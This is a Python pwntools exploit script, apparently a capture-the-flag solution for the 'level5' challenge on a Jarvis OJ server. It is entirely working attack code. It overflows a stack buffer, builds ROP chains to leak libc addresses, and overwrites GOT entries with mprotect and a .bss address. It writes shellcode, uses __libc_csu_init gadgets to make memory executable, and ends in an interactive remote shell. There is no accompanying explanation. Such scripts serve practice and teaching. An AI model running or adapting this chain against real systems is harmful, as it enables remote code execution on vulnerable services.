from pwn import *

context(log_level = 'debug',os = 'linux',arch = 'amd64')

#n = process('./level5')
n = remote('pwn2.jarvisoj.com', 9884)
#n = remote("localhost",12345)

elf = ELF('./level5')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so')

offset = 0x88

read_got = elf.got['read']
read_plt = elf.symbols['read']
write_plt = elf.symbols['write']
main_addr = elf.symbols['main']
bss_addr = elf.bss()
shellcode = asm(shellcraft.sh())

pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_pop_r15_ret_addr = 0x00000000004006b1

payload1 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_pop_r15_ret_addr) +  p64(read_got) + 'deadbuff' + p64(write_plt) + p64(main_addr)

n.recvuntil("Input:\n")
n.send(payload1)
sleep(0.2)
pause()
read_addr = u64(n.recv(8))

libc.address = read_addr - libc.symbols['read']

mprotect_addr = libc.symbols['mprotect']
print 'mprotect_addr = ' + hex(mprotect_addr)


#write the mprotect to got table
libc_start_main_got = elf.got['__libc_start_main']
payload2 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(libc_start_main_got) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload2)
sleep(0.2)
n.send(p64(mprotect_addr))
sleep(0.2)
pause()

#write the shellcode to bss
payload3 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(bss_addr) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload3)
sleep(0.2)
n.send(shellcode)
sleep(0.2)
pause()

#write the bss to got table
gmon_start_got = elf.got['__gmon_start__']
payload4 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(gmon_start_got) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload4)
sleep(0.2)
n.send(p64(bss_addr))
sleep(0.2)
pause()

csu_start = 0x4006AA
csu_end = 0x400690

payload5 = 'a' * offset + p64(csu_start) + p64(0) + p64(1) + p64(libc_start_main_got) + p64(7) + p64(0x1000) + p64(0x600000) + p64(csu_end)
payload5 += 'deadbuff' + p64(0) + p64(1) + p64(gmon_start_got) + p64(0) +p64(0) + p64(0) + p64(csu_end)
n.send(payload5)
sleep(0.2)
pause()

n.interactive()
